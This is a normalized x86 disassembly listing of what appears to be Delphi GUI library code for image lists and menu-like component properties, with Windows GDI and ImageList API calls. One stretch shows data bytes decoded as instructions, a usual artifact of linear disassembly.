mov esi edx
mov ebx eax
mov eax ebx
call sub_440df8
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_416a08
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_416b94
sub_440eb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4042a8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403ef0
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_440edc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4411d8
mov edx ebx
mov eax esi
call sub_4411b8
sub_440f04
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_440edc
sub_440f30
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_455b10
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403360
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41ce90
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_432048
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440f88
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_455b38
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403360
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41ceac
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_432048
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440fe0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41c4b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_441164
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44104c
push ebx
push esi
push edi
call sub_4034d8
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403164
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_416c00
call sub_403164
mov eax [ edi + 0x30 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41c504
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034c0
sub_44109c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4410e4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_416b74
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403314
mov edx edi
call sub_440e68
sub_441130
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_442934
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_442978
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41c588
sub_441170
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41c7d4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_4411d8
sub_4411b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4169bc
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_41c588
pop esi
pop ebx
retn
sub_4411d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_416c5c
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_4411f4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_44125c
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_44b9e8
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_4441d0
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_441a64
mov edx ebp
call sub_441ac4
inc eax
je r-xdata
sub_4412e8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_441308
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_441420
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41cdc0
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_441474
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403164
mov eax [ esi + 0x9c ]
call sub_403164
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440dc4
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40cd4c
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4414c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4171a0
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_441570
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_4415d0
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_4416d8
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_441810
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_441870
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_4418cc
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_441930
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_441570
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4042a8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403ef0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
sub_4415d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_4416c8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_441128
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_441114
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_4415d0
sub_4416d8
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
sub_441750
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4042a8
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403ef0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416b18
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_416b18
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
sub_4417b8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
sub_441810
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4042a8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403ef0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
sub_441870
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
sub_4418cc
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
sub_441930
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_416b18
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403314
test eax eax
je r-xdata
sub_441990
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4042a8
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_41ca10
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_441570
sub_4419dc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_441a04
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_440f30
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_4415d0
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_441a98
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_418160
mov edi eax
mov eax esi
call sub_4444bc
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_441ac4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_441b08
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_441b2d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441b34
retn
sub_441bb4
clc
xor [ eax + eax + 0xb ] eax
push esp
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
sub al 0x1c
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x441c ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] dh
inc esp
add [ eax + 0x1c ] bh
inc esp
add [ eax ] ch
add [ eax ] al
in al 0x53
inc ecx
add [ eax ] ch
int3
sub_441cf8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41c4b8
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_441d44
push ebx
push esi
push edi
call sub_4034d8
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_416c00
mov edx eax
mov eax edi
call sub_442934
mov eax [ edi + 0x50 ]
call sub_403164
mov eax edi
call sub_442008
mov eax [ edi + 0x4c ]
call sub_403164
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41c504
test bl bl
jle r-xdata
call sub_403164
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034c0
sub_441db0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_441e5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_4428bc
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_441e7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e64
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
sub_441e7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_441f1d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_423ba0
mov eax ebx
call sub_423080
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41fcc0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4156e4
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_423080
pop edx
call sub_420064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441f24
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_441f40
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_441e7c
pop ecx
pop edx
pop ebx
retn
sub_441f78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_442008
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_441f40
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403360
sub_441fb4
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_442844
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_4230ec
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_442008
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_441e68
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403360
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_441fa4
push eax
call ImageList_Destroy
sub_442040
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4420d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_441e68
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4420da
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
mov edx eax
mov eax ebx
call sub_442268
sub_4420e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44218f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_422ab8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442172
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441e70
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441fb4
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441fb4
push eax
mov eax [ ebp - 0x4 ]
